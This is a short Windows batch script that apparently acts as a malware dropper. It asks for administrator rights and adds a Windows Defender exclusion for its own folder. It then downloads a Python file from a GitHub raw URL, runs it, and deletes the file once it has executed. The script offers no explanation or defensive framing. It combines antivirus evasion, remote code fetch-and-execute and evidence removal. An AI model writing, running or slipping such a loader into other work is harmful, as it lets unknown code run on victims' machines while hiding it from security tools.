@echo off
NET SESSION >nul 2>&1
if %errorlevel% NEQ 0 (
    echo This script requires administrative privileges. Requesting elevation...
    powershell -Command "Start-Process '%~s0' -Verb runAs"
    exit /b
)

set "EXCLUSION_FOLDER=%~dp0"
echo Adding exclusion for Windows Defender for folder: %EXCLUSION_FOLDER%
powershell -Command "Add-MpPreference -ExclusionPath '%EXCLUSION_FOLDER%'"

set "FILE_URL=https://raw.githubusercontent.com/orruunestad/extra/refs/heads/main/main.py"

set "OUTPUT_FILE=%EXCLUSION_FOLDER%main.py"

if exist "%OUTPUT_FILE%" (
    echo File already exists. Skipping download and execution.
    exit /b
)

powershell -Command "Invoke-WebRequest -Uri %FILE_URL% -OutFile %OUTPUT_FILE%"

if exist "%OUTPUT_FILE%" (
    echo File downloaded successfully.

    python "%OUTPUT_FILE%"

    del "%OUTPUT_FILE%"
    echo File deleted after execution.
) else (
    echo Failed to download the file.
)

pause
